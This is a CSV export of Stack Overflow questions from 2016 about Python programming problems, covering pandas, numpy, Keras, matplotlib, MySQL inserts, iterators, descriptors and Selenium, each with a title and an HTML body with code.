Id,OwnerUserId,CreationDate,Score,Title,Body
40123132,2344024.0,2016-10-19 05:45:43+00:00,3,Vectorizing calculations in pandas,"<p>I'm trying to calculate group averages inside of the cross-validation scheme, but this iterating method is extremely slow as my dataframe contains more than 1mln rows. Is it possible to vectorize this calculation? Thanks.</p>

<pre><code>import pandas as pd
import numpy as np
data = np.column_stack([np.arange(1,101), np.random.randint(1,11, 100),np.random.randint(1,101, 100)])
df = pd.DataFrame(data, columns=['id', 'group','total'])
from sklearn.cross_validation import KFold
kf = KFold(df.shape[0], n_folds=3, shuffle = True)
f = {'total': ['mean']}
df['fold'] = 0
df['group_average'] = 0
for train_index, test_index in kf:
    df.ix[train_index, 'fold'] = 0
    df.ix[test_index, 'fold'] = 1
    aux = df.loc[df.fold == 0, :].groupby(['group'])
    aux2 = aux.agg(f)
    aux2.reset_index(inplace = True)
    aux2.columns = ['group', 'group_average']
    for i, row in df.loc[df.fold == 1, :].iterrows():
        new = aux2.ix[(aux2.group == row.group),'group_average']
        if new.empty == True:
            new = 0
        else:
            new = new.values[0]
        df.ix[i, 'group_average'] = new
</code></pre>
"
39762576,1831784.0,2016-09-29 06:06:25+00:00,3,Dataframe returning None value,"<p>I was returning a dataframe of characters from GOT such that they were alive and predicted to die, but only if they have some house name. (important person). I was expecting it to skip NaN's, but it returned them as well. I've attached screenshot of output. Please help.</p>

<p>PS I haven't attached any spoilers so you may go ahead.</p>

<pre><code>import pandas
df=pandas.read_csv('character-predictions.csv')
a=df[((df['actual']==1) &amp; (df['pred']==0)) &amp; (df['house'] !=None)]
b=a[['name', 'house']]
</code></pre>

<p><a href=""http://i.stack.imgur.com/xhUEb.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/xhUEb.png"" alt=""enter image description here""></a></p>
"
40042223,4401573.0,2016-10-14 11:36:22+00:00,3,User defined legend in python,"I have this plot in which some areas between curves are being filled by definition. Is there any way to include them in legend? Especially where those filled areas are overlapped and as well as that a new and different color is being appeared.

<p>Or there is possibility to define an arbitrary legend regardless of the curves' data?
<a href=""https://i.stack.imgur.com/NtJ74.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/NtJ74.png"" alt=""enter image description here""></a></p>
"
39731669,2585497.0,2016-09-27 18:16:22+00:00,3,Merge Variables in Keras,"<p>I'm building a convolutional neural network with Keras and would like to add a single node with the standard deviation of my data before the last fully connected layer.</p>

<p>Here's a minimum code to reproduce the error:</p>

<pre><code>from keras.layers import merge, Input, Dense
from keras.layers import Convolution1D, Flatten
from keras import backend as K

input_img = Input(shape=(64, 4))

x = Convolution1D(48, 3, activation='relu', init='he_normal')(input_img)
x = Flatten()(x)

std = K.std(input_img, axis=1)
x = merge([x, std], mode='concat', concat_axis=1)

output =  Dense(100, activation='softmax', init='he_normal')(x)
</code></pre>

<p>This results in the following <code>TypeError</code>:</p>

<pre><code>-----------------------------------------------------------------
TypeError                       Traceback (most recent call last)
&lt;ipython-input-117-c1289ebe610e&gt; in &lt;module&gt;()
      6 x = merge([x, std], mode='concat', concat_axis=1)
      7 
----&gt; 8 output =  Dense(100, activation='softmax', init='he_normal')(x)

/home/ubuntu/anaconda2/envs/tensorflow/lib/python2.7/site-packages/keras/engine/topology.pyc in __call__(self, x, mask)
    486                                     '`layer.build(batch_input_shape)`')
    487             if len(input_shapes) == 1:
--&gt; 488                 self.build(input_shapes[0])
    489             else:
    490                 self.build(input_shapes)

/home/ubuntu/anaconda2/envs/tensorflow/lib/python2.7/site-packages/keras/layers/core.pyc in build(self, input_shape)
    701 
    702         self.W = self.init((input_dim, self.output_dim),
--&gt; 703                            name='{}_W'.format(self.name))
    704         if self.bias:
    705             self.b = K.zeros((self.output_dim,),

/home/ubuntu/anaconda2/envs/tensorflow/lib/python2.7/site-packages/keras/initializations.pyc in he_normal(shape, name, dim_ordering)
     64     '''
     65     fan_in, fan_out = get_fans(shape, dim_ordering=dim_ordering)
---&gt; 66     s = np.sqrt(2. / fan_in)
     67     return normal(shape, s, name=name)
     68 

TypeError: unsupported operand type(s) for /: 'float' and 'NoneType'
</code></pre>

<p>Any idea why?</p>
"
39726583,1175065.0,2016-09-27 13:54:21+00:00,3,Plot is behaving weird,"<p>I am trying to plot some trajectories in 3D. I noticed that the plot function is behaving weird. </p>

<p>I defined a variable named <code>pos</code>, which is a 2 dimensional matrix. It has 3 columns, where each column represents a coordinate axis. Please see the complete code below-</p>

<pre><code>import numpy as np
import matplotlib as mpl
import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import Axes3D

max = 1.0
min = -1.0
cols = 3
goals = 4
timesteps = 20

#pos = np.zeros((timesteps, cols)) # this doesn't works hence commented

fig = plt.figure()
ax = fig.gca(projection='3d')
for i in range(goals):
    pos = np.zeros((timesteps, cols)) # this works as expected
    for t in range(timesteps):
        pos[t] = np.random.uniform(low=min, high=max, size=cols)
    ax.plot(pos[:, 0], pos[:, 1], pos[:, 2])

ax.set_xlabel('x')
ax.set_ylabel('y')
ax.set_zlabel('z')
plt.show()
</code></pre>

<p>The plot doesn't draw everthing, when <code>pos</code> is defined globally. I noticed that defining <code>pos</code> inside the <code>for</code> loop, solve the problem. It looks weird to me.</p>

<p>Below is the plot, generated from global <code>pos</code> variable (after commenting the <code>pos</code> defined inside <code>for</code> loop and keeping the global <code>pos</code> variable enabled)-
<a href=""http://i.stack.imgur.com/dfbzx.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/dfbzx.png"" alt=""enter image description here""></a></p>

<p>Below is the plot, generated from inner <code>pos</code> variable (after commenting the global <code>pos</code> variable and keeping the <code>pos</code> defined inside <code>for</code> loop enabled)-
<a href=""http://i.stack.imgur.com/iaw2u.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/iaw2u.png"" alt=""enter image description here""></a></p>

<p>What is the reason of for this kind of behavior?</p>
"
39726577,6837081.0,2016-09-27 13:54:04+00:00,3,"How to determine what fields are required by a REST API, from the API?","<p>I'm working with a networking appliance that has vague API documentation. I'm able to execute PATCH and GET requests fine, but POST isn't working. I receive HTTP status error 422 as a response, I'm missing a field in the JSON request, but I am providing the required fields as specified in the documentation. I have tried the Python Requests module and the vendor-provided PyCurl module in their sample code, but have encountered the same error.</p>

<p>Does the REST API have a debug method that returns the required fields, and its value types, for a specific POST? I'm speaking more of what the template is configured to see in the request (such as JSON <code>{str(ServerName) : int(ServerID)}</code>, not what the API developer may have created.</p>
"
39726124,2903709.0,2016-09-27 13:35:32+00:00,3,Dictionary of dictionaries vs dictionary of class instances,"<p>I understand what a class is, a bundle of attributes and methods stored together in one object. However, i don't think i have ever really grasped their full power. I taught myself to manipulate large volumes of data by using 'dictionary of dictionary' data structures. I'm now thinking if i want to fit in with the rest of the world then i need to implement classes in my code, but i just don't get how to make the transition.</p>

<p>I have a script which gets information about sales orders from a SQL query, performs operations on the data, and outputs it to a csv.</p>

<p>1) (the way i currently do it, store all the orders in a dictionary of dictionaries)</p>

<pre><code>cursor.execute(querystring)

# create empty dictionary to hold orders
orders = {}

# define list of columns returned by query
columns = [col[0] for col in cursor.description]

for row in cursor:
    # create dictionary of dictionaries where key is order_id
    # this allows easy access of attributes given the order_id
    orders[row.order_id] = {}
    for i, v in enumerate(columns):
        # add each field to each order
        orders[row.order_id][v] = row[i]

# example operation
for order, fields in orders.iteritems():
    fields['long'], fields['lat'] = getLongLat(fields['post_code'])

# example of another operation
cancelled_orders = getCancelledOrders()
for order_id in cancelled_orders:
    orders[order_id]['status'] = 'cancelled'

# Other similar operations go here...

# write to file here...
</code></pre>

<p>2) (the way i THINK i would do it if i was using classes)</p>

<pre><code>class salesOrder():


    def __init__(self, cursor_row):
        for i, v in enumerate(columns):
            setattr(self, v, cursor_row[i])


    def getLongLat(self, long_lat_dict):
        self.long, self.lat = long_lat_dict[self.post_code]['long'], long_lat_dict[self.post_code]['lat']


    def cancelOrder(self):
        self.status = 'cancelled'


    # more methods here


cursor.execute(querystring)

# create empty dictionary to hold orders
orders = {}

# define list of columns returned by query
columns = [col[0] for col in cursor.description]

for row in cursor:
    orders[row.order_id] = salesOrder(row)
    orders[row.order_id].getLongLat()

# example of another operation
cancelled_orders = getCancelledOrders()
for order_id in cancelled_orders:
    orders[order_id].cancelOrder()

# other similar operations go here

# write to file here
</code></pre>

<p>I just get the impression that i'm not quite understanding the best way to use classes. Have i got the complete wrong idea about how to use classes? Is there some sense to what i'm doing but it needs refactoring? or am i trying to use classes for the wrong purpose?</p>
"
39732213,3620003.0,2016-09-27 18:48:35+00:00,3,Subclassing numpy.ndarray - why is __array_finalize__ not being called twice here?,"<p>According to <a href=""http://docs.scipy.org/doc/numpy/user/basics.subclassing.html"" rel=""nofollow"">this</a> primer on subclassing <code>ndarray</code>, the <code>__array_finalize__</code> method is guaranteed to be called, no matter if the subclass is instantiated directly, casted as a view or created from a template.</p>

<p>In particular, when calling the constructor explicitly, the order of methods called is <code>__new__</code> -> <code>__array_finalize__</code> -> <code>__init__</code>.</p>

<p>I have the following simple subclass of <code>ndarray</code> which allows an additional <code>title</code> attribute.</p>

<pre><code>class Frame(np.ndarray):    
    def __new__(cls, input_array, title='unnamed'):
        print 'calling Frame.__new__ with title {}'.format(title)
        self = input_array.view(Frame) # does not call __new__ or __init__
        print 'creation of self done, setting self.title...'
        self.title = title
        return self

    def __array_finalize__(self, viewed):
        # if viewed is None, the Frame instance is being created by an explicit
        # call to the constructor, hence Frame.__new__ has been called and the
        # title attribute is already set
        #
        # if viewed is not None, the frame is either being created by view
        # casting or from template, in which case the title of the viewed object
        # needs to be forwarded to the new instance
        print '''calling Frame.__array_finalize__ with type(self) == {} and
        type(viewed) == {}'''.format(type(self), type(viewed))

        if viewed is not None:
            self.title = getattr(viewed, 'title', 'unnamed')

        print self.title
</code></pre>

<p>which produces the following output:</p>

<pre><code>&gt;&gt;&gt; f = Frame(np.arange(3), 'hallo')
calling Frame.__new__ with title hallo
calling Frame.__array_finalize__ with type(self) == &lt;class '__main__.Frame'&gt; and
        type(viewed) == &lt;type 'numpy.ndarray'&gt;
unnamed
creation of self done, setting self.title...
&gt;&gt;&gt; f.title
'hallo'
</code></pre>

<p>As you can see, <code>__array_finalize__</code> is being called as a result of the line</p>

<pre><code> self = input_array.view(Frame)
</code></pre>

<p>Question: why is <code>__array_finalize__</code> not being called again as part of the <code>__new__</code> -> <code>__array_finalize__</code> -> <code>__init__</code> chain?</p>
"
39608282,5606318.0,2016-09-21 05:36:20+00:00,3,Pandas error trying to convert string into integer,"<p>Requirement : </p>

<p>One particular column in a DataFrame is 'Mixed' Type. It can have values like <code>""123456""</code> or <code>""ABC12345""</code>.</p>

<p>This dataframe is being written into an Excel using xlsxwriter .</p>

<p>For values like <code>""123456""</code>, down the line Pandas converting it into <code>123456.0</code> ( Making it look like a float)</p>

<p>We need to put it into xlsx as 123456 (i.e as +integer) in case value is FULLY numeric.</p>

<p>Effort :</p>

<p>Code Snippet shown below</p>

<pre><code>import pandas as pd
import numpy as np
import xlsxwriter
import os
import datetime
import sys
excel_name = str(input(""Please Enter Spreadsheet Name :\n"").strip())

print(""excel entered :   ""   , excel_name)
df_header = ['DisplayName','StoreLanguage','Territory','WorkType','EntryType','TitleInternalAlias',
         'TitleDisplayUnlimited','LocalizationType','LicenseType','LicenseRightsDescription',
         'FormatProfile','Start','End','PriceType','PriceValue','SRP','Description',
         'OtherTerms','OtherInstructions','ContentID','ProductID','EncodeID','AvailID',
         'Metadata', 'AltID', 'SuppressionLiftDate','SpecialPreOrderFulfillDate','ReleaseYear','ReleaseHistoryOriginal','ReleaseHistoryPhysicalHV',
          'ExceptionFlag','RatingSystem','RatingValue','RatingReason','RentalDuration','WatchDuration','CaptionIncluded','CaptionExemption','Any','ContractID',
          'ServiceProvider','TotalRunTime','HoldbackLanguage','HoldbackExclusionLanguage']
first_pass_drop_duplicate = df_m_d.drop_duplicates(['StoreLanguage','Territory','TitleInternalAlias','LocalizationType','LicenseType',
                                   'LicenseRightsDescription','FormatProfile','Start','End','PriceType','PriceValue','ContentID','ProductID',
                                   'AltID','ReleaseHistoryPhysicalHV','RatingSystem','RatingValue','CaptionIncluded'], keep=False) 
# We need to keep integer AltID  as is

first_pass_drop_duplicate.loc[first_pass_drop_duplicate['AltID']] =   first_pass_drop_duplicate['AltID'].apply(lambda x : str(int(x)) if str(x).isdigit() == True else x)
</code></pre>

<p>I have tried :</p>

<pre><code>1. using `dataframe.astype(int).astype(str)` # works as long as value is not alphanumeric
2.importing re and using pure python `re.compile()` and `replace()` -- does not work
3.reading DF row by row in a for loop !!! Kills the machine as dataframe can have 300k+ records
</code></pre>

<p>Each time, error I get:</p>

<blockquote>
  <p>raise KeyError('%s not in index' % objarr[mask])<br>
  KeyError: '[ 102711.  102711.  102711.  102711.  102711.  102711.  102711.     102711.\n  102711.  102711.  102711.  102711.  102711.  102711.  102711.  102711.\n  102711.  102711.  102711.  102711.  102711.  102711.  102711.  102711.\n  102711.  102711.  102711.  102711.  102711.  102711.  102711.  102711.\n  102711.  102711.  102711.  102711.  102711.  102711.  102711.  102711.\n  102711.  102711.  102711.  102711.  102711.  102711.  102711.  102711.\n  102711.  102711.  102711.  102711.  102711.  102711.  102711.  102711.\n  102711.  102711.  102711.  102711.  102711.  102711.  102711.  102711.\n    5337.    5337.    5337.    5337.    5337.    5337.    5337.    5337.\n    5337.    5337.    5337.    5337.    5337.    5337.    5337.    5337.\n    5337.    5337.    5337.    5337.    5337.    5337.    5337.    5337.\n    5337.    5337.    5337.    5337.    5337.    5337.    5337.    5337.\n    5337.    5337.    5337.    5337.    5337.    5337.    5337.    5337.\n    5337.    5337.    2124.    2124.    2124.    2124.    2124.    2124.\n    2124.    2124.    6643.    6643.    6643.    6643.    6643.    6643.\n    6643.    6643.    6643.    6643.    6643.    6643.    6643.    6643.\n    6643.    6643.    6643.    6643.    6643.    6643.    6643.    6643.\n    6643.    6643.    6643.    6643.    6643.    6643.    6643.    6643.] not in index'</p>
</blockquote>

<p>I am newbie in python/pandas , any help, solution is much appreciated.</p>
"
39715950,6724844.0,2016-09-27 04:25:18+00:00,3,groupby and add some rows,"<p>I have a dataframe below</p>

<pre><code>   A  B
0  a  1
1  a  2
2  c  3
3  c  4
4  e  5
</code></pre>

<p>I would like to get summing result below.key = column A</p>

<pre><code>df.B.groupby(df.A).agg(np.sum)
</code></pre>

<p>But I want to add specific row. </p>

<pre><code>   B
a  3
b  0
c  7
d  0
e  5
f  0
</code></pre>

<p>but I should add row ""b"" and ""d"".""f""</p>

<p>How can I get this result ?</p>
"
39764582,6869965.0,2016-09-29 07:59:22+00:00,3,"""Densifying"" very large sparse matrices by rearranging rows/columns","<p>I have a very large sparse matrix (240k*4.5k, â¤1% non-zero elements), which I would like to ""densify"" by rearranging its rows and columns in a way that the upper left region is enriched in non-zero elements as much as possible. (To make it more manageable and visually assessable.) I would prefer <code>scipy</code> and related tools to do this.</p>

<ul>
<li>A good suggestion was already made <a href=""http://stackoverflow.com/questions/15155276/rearrange-sparse-arrays-by-swapping-rows-and-columns"">here</a> for a solution to ""manually"" swap rows/columns of sparse matrices, but it does not cover the challenge of identifying which rows/columns to swap to get an optimal enrichment (dense block) in the upper left corner.</li>
<li>Note that a simple sorting of rows/columns based on the number of non-zero elements does not solve the problem. (If I take <em>e.g.</em> the two rows with the most elements, there will not necessarily be any overlap between them in terms of where - <em>i.e.</em> in which columns - are the elements located.)</li>
<li>I'm also curious about the optimal sparse matrix representation in <code>scipy.sparse</code> for this task.</li>
</ul>

<p>Any suggestions or specific implementation ideas are welcome.</p>
"
39711281,1658617.0,2016-09-26 19:54:31+00:00,3,How does a descriptor with __set__ but without __get__ work?,"<p>I read somewhere about the fact you can have a descriptor with <code>__set__</code> and without <code>__get__</code>.</p>

<p>How does it work? </p>

<p>Does it count as a data descriptor? Is it a non-data descriptor?</p>

<p>Here is a code example:</p>

<pre><code>class Desc:
    def __init__(self, name):
        self.name = name
    def __set__(self, inst, value):
        inst.__dict__[self.name] = value
        print(""set"", self.name)

class Test:
    attr = Desc(""attr"")

&gt;&gt;&gt;myinst = Test()
&gt;&gt;&gt; myinst.attr = 1234
set attr
&gt;&gt;&gt; myinst.attr
1234
&gt;&gt;&gt; myinst.attr = 5678
set attr
&gt;&gt;&gt; myinst.attr
5678
</code></pre>
"
39626233,5302241.0,2016-09-21 20:42:04+00:00,3,How did numpy implement multi-dimensional broadcasting?,"<p>Memory (row major order):</p>

<pre><code>[[A(0,0), A(0,1)]
 [A(1,0), A(1,1)]]

has this memory layout: 
[A(0,0), A(0,1), A(1,0), A(1,1)]
</code></pre>

<p>I guess the algorithm work like this in the following cases.</p>

<p>Broadcasting Dimension is last dimension:</p>

<pre><code>[[0, 1, 2, 3]         [[1]
                  x
 [4, 5, 6, 7]]         [10]]

   A (2 by 4)            B (2 by 1)

Iterate 0th dimensions of A and B simultaneously {
    Iterate last dimension of A{
        multiply;
    } 
}
</code></pre>

<p>Broadcasting dimension is 0th dimension:</p>

<pre><code>[[0, 1, 2, 3]   
                  x    [[1,10,100,1000]]
 [4, 5, 6, 7]]

   A (2 by 4)              B (1 by 4)

Iterate 0th dimension of A{
    Iterate 1st dimensions of A and B simultaneously{
        multiply;
    }
}
</code></pre>

<p>Question:</p>

<ol>
<li><p>How does numpy know which order of multiplication is the best.
(reading memory in order is better than reading memory all over the place. but how did numpy figure that out?)</p></li>
<li><p>What would numpy do if the arrays have more than two dimension</p></li>
<li>What would numpy do if the broadcasting dimension is not the last dimension?</li>
</ol>

<p>2nd guess of what is going on:</p>

<pre><code>#include &lt;iostream&gt;
int main(void){
    const int nA = 12;
    const int nB = 3;
    int A[nA];
    int B[nB];
    for(int i = 0; i != nA; ++i) A[i] = i+1;
    for(int i = 0; i != nB; ++i) B[i] = i+1;
    //dimension
    int dA[] = {2,3,2};
    int dB[] = {1,3,1};

    int* pA = A;
    int* pB = B;
    int* pA_end = A + nA;
    //is it possible to make the compiler
    //generate the iA and sA?
    int iB = 0;
    int iB_max = 2;
    int sB[] = {1,0};

    while(pA != pA_end){
        std::cout &lt;&lt; ""*pA, *pB: "" &lt;&lt; *pA &lt;&lt; "", "" &lt;&lt; *pB &lt;&lt;std::endl;
        std::cout &lt;&lt; ""iB: "" &lt;&lt; iB &lt;&lt;std::endl;
        *(pA) *= *(pB);
        ++pA;
        pB += sB[iB];
        ++iB;
        if (iB == iB_max) {iB = 0; pB = B;}
    }

    for(pA = A; pA != pA_end; ++pA){
        std::cout &lt;&lt; *(pA) &lt;&lt; "", "";
    }
    std::cout &lt;&lt; std::endl;       
}
</code></pre>
"
39806895,2131849.0,2016-10-01 12:59:36+00:00,3,find all files matching exact name with and without an extension,"<p>I'm using glob to scan a specified directory to find all files matching the specified name, but I can't seem to get it to work with files with no extension without finding files matching the name and then some...</p>

<p>For example, here's some files:<br>
- file<br>
- file2<br>
- file.dat</p>

<p>The resulting list should be:<br>
<code>[ 'file', 'file.dat' ]</code></p>

<p>How can I get glob to work as expected??</p>
"
39807008,6636423.0,2016-10-01 13:10:37+00:00,3,is comparison returns False with strings using same id,"<p>I was playing around with Python <code>is</code> and <code>==</code> operator. As far as I know, is operator checks whether two objects have same id, but in my case operator returns False even if two substrings have the same id. </p>

<p>Here is the code:</p>

<pre><code>#! /usr/bin/python3
# coding=utf-8
string = ""HelloWorld""

print(id(string))    #140131089280176
print(id(string[0:5]))  #140131089251048
print(id(string[-10:-5]))   #140131089251048


print(string[0:5] == string[-10:-5])    #True
print(string[0:5] is string[-10:-5])    #False
</code></pre>

<p>Substrings do not have same id with the original string as expected, but why is operator returns false with 2 substrings with the same id?</p>
"
39629823,4364985.0,2016-09-22 03:37:36+00:00,3,Inserting NULL value to a double data type MySQL Python,"<p>I have a table. This is the create statement. </p>

<pre><code>   CREATE TABLE `runsettings` (
  `runnumber` mediumint(9) NOT NULL,
  `equipment` varchar(45) NOT NULL,
  `wafer` varchar(45) NOT NULL,
  `settingname` varchar(100) NOT NULL,
  `float8value` double DEFAULT NULL,
  `apcrunid` varchar(45) DEFAULT NULL,
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `intvalue` int(11) DEFAULT NULL,
  `floatvalue` float DEFAULT NULL,
  `Batch` varchar(45) DEFAULT NULL,
  `IndexNum` smallint(6) DEFAULT '1',
  `stringvalue` mediumtext,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=1056989 DEFAULT CHARSET=latin1;
</code></pre>

<p>This is my insert statement :</p>

<pre><code>import mysql.connector

cnx = mysql.connector.connect(user='test',
                                password ='test',host='0.0.0.1',
                              database='test')


vallist = [(471285, u'CT19', 7, u'271042', u'Etch Time Min', None, None, None),
           (471285, u'CT19', 7, u'00000', u'Etch Time Min', None, None, 'None')]


cursor = cnx.cursor()
# ss = 

cursor.executemany(""INSERT INTO runsettings (apcrunid,equipment,runnumber,wafer,settingname,intvalue,floatvalue,float8value) VALUES (%s,%s,%s,%s,%s,%s,%s,%s)"",vallist)
cnx.commit()
</code></pre>

<p>So I try to insert these values .</p>

<pre><code>vallist = [471285, u'CT19', 7, u'271042', u'Etch Time Min', None, None, None,
           471285, u'CT19', 7, u'00000', u'Etch Time Min', None, None, 'None']
</code></pre>

<p>This is getting inserted. 
Result on DB
<a href=""http://i.stack.imgur.com/soQHW.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/soQHW.png"" alt=""enter image description here""></a>
But when the list value is this one (difference is the string <code>'None'</code> gets evaluated first): </p>

<pre><code>vallist = [471285, u'CT19', 7, u'271042', u'Etch Time Min', None, None, 'None', 
           471285, u'CT19', 7, u'271042', u'Etch Time Min', None, None, None]
</code></pre>

<p>It gives out the truncated error. </p>

<pre><code>Data truncated for column 'float8value' at row 2 
</code></pre>

<p>How come when the row that contains <code>None</code> is the first on the list  it doesn't give out the same truncated error on the first list? </p>
"
39807586,5390604.0,2016-10-01 14:08:22+00:00,3,How to create Python dictionary with multiple 'lists' for each key by reading from .txt file?,"<p>I have a large text file that looks like:</p>

<pre><code>1   27  21  22
1   151 24  26
1   48  24  31
2   14  6   8
2   98  13  16
.
.
.
</code></pre>

<p>that I want to create a dictionary with. The first number of each list should be the key in the dictionary and should be in this format:</p>

<pre><code>{1: [(27,21,22),(151,24,26),(48,24,31)],
 2: [(14,6,8),(98,13,16)]}
</code></pre>

<p>I have the following code (with total points being the largest number in the first column of the text file (ie largest key in dictionary)):</p>

<pre><code>from collections import defaultdict

info = defaultdict(list)
filetxt = 'file.txt'
i = 1

with open(filetxt, 'r') as file:
    for i in range(1, num_cities + 1):
        info[i] = 0
    for line in file:
        splitLine = line.split()
        if info[int(splitLine[0])] == 0:
            info[int(splitLine[0])] = (["","".join(splitLine[1:])])
        else:
            info[int(splitLine[0])].append(("","".join(splitLine[1:])))
</code></pre>

<p>which outputs</p>

<pre><code>{1: ['27,21,22','151,24,26','48,24,31'],
 2: ['14,6,8','98,13,16']}
</code></pre>

<p>The reason I want to do this dictionary is because I want to run a for loop through each ""inner list"" of the dictionary for a given key:</p>

<pre><code>for first, second, third, in dictionary:
   ....
</code></pre>

<p>I cannot do this with my current code because of the slightly different format of the dictionary (it expects 3 values in the for loop above, but receives more than 3), however it would work with the first dictionary format.</p>

<p>Can anyone suggest anyway to fix this?</p>
"
39711977,5882284.0,2016-09-26 20:39:29+00:00,3,How can I filter for string values in a mixed datatype object in Python Pandas Dataframe,"<p>I have a column in a Pandas Dataframe like:(whose value_counts are shown below)</p>

<pre><code>1                      246804
2                      135272
5                        8983
8                        3459
4                        3177
6                        1278
9                         522
D                         314
E                          91
0                          29
F                          20    
Name: Admission_Source_Code, dtype: int64
</code></pre>

<p>As you can see it contains both integers and letters. I'm having to write a function where I would have to filter and search for the lettered values.</p>

<p>I was initially importing this dataset using pd.read_excel, but after having read multiple bug reports, it seems that read_excel doesnt have option to explicitly read a column as a string.</p>

<p>So I tried reading using pd.read_csv which has the dtype option. Initially this column was being stored as float64 by default, now even though I have tried to run</p>

<pre><code>Df_name['Admission_Source_Code'] = Df_name['Admission_Source_Code'].astype(int).astype('str')
</code></pre>

<p>I'm unable to format it as a string column.</p>

<p>Hence, when I filter for </p>

<pre><code>Accepted[Accepted['Admission_Source_Code']==1]
</code></pre>

<p>it works, but </p>

<pre><code>Accepted[Accepted['Admission_Source_Code']=='E']
</code></pre>

<p>still returns no results. When i try and say str(column_name) in the mask, it says invalid literal.
Can someone please help me on how would i go about either changing the dtype or how to filter for lettered values?</p>

<p>Thanks.</p>

<p>P.S. even formatting as object doesnt help</p>
"
39807948,6719286.0,2016-10-01 14:47:12+00:00,3,Deleting a list after creating an iterator object from it,"<p>I am trying to understand the concept of iterators in python and tried this in Python 3.5.2.</p>

<pre><code>x = list(range(1000))    # size of x is 9112 bytes
y = iter(x)              # size of y is 56 bytes
del x
x = list(y)              # size of x is again 9112 bytes
</code></pre>

<p>How does the iterator store the information about the sequence it has to generate?</p>

<p>It does not contain all the elements but even after deleting the original list we are still able to reproduce the original list from the iterator?</p>

<p>If it does not contain all the elements how does it know which is the next element even after deleting <code>x</code>?</p>
"
39711674,4308281.0,2016-09-26 20:17:24+00:00,3,Firefox blank webbrowser with selenium,"<p>When I call a firefox webbrowser with python firefox webdriver, the firefox is opening with a blank page (nothing in the navigation barre), wait and close.</p>

<p>The python consol give me this error :</p>

<p>Traceback (most recent call last):
  File ""firefox_selenium2.py"", line 4, in 
    driver = webdriver.Firefox()
  File ""/usr/local/lib/python3.5/dist-packages/selenium/webdriver/firefox/webdriver.py"", line 80, in <strong>init</strong>
    self.binary, timeout)
  File ""/usr/local/lib/python3.5/dist-packages/selenium/webdriver/firefox/extension_connection.py"", line 52, in <strong>init</strong>
    self.binary.launch_browser(self.profile, timeout=timeout)
  File ""/usr/local/lib/python3.5/dist-packages/selenium/webdriver/firefox/firefox_binary.py"", line 68, in launch_browser
    self._wait_until_connectable(timeout=timeout)
  File ""/usr/local/lib/python3.5/dist-packages/selenium/webdriver/firefox/firefox_binary.py"", line 108, in _wait_until_connectable
    % (self.profile.path))
selenium.common.exceptions.WebDriverException: Message: Can't load the profile. Profile Dir: /tmp/tmpngm7g76x If you specified a log_file in the FirefoxBinary constructor, check it for details.</p>

<p>My code is the exemple from the python selenium read_the_doc :
from selenium import webdriver
from selenium.webdriver.common.keys import Keys</p>

<pre><code>driver = webdriver.Firefox()
driver.get(""http://www.python.org"")
assert ""Python"" in driver.title
elem = driver.find_element_by_name(""q"")
elem.clear()
elem.send_keys(""pycon"")
elem.send_keys(Keys.RETURN)
assert ""No results found."" not in driver.page_source
driver.close()
</code></pre>

<p>Any help would be appreciated</p>

<p>PS : firefox version 49
selenium version 2.53.6
python 3.5</p>
"
